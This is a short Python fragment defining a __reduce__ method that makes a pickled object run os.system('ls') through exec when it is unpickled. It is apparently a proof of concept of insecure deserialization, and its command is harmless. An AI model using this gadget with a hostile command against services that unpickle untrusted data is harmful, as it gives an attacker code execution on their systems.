def __reduce__(self): 
    return (exec, ('import os;os.system("ls")', ))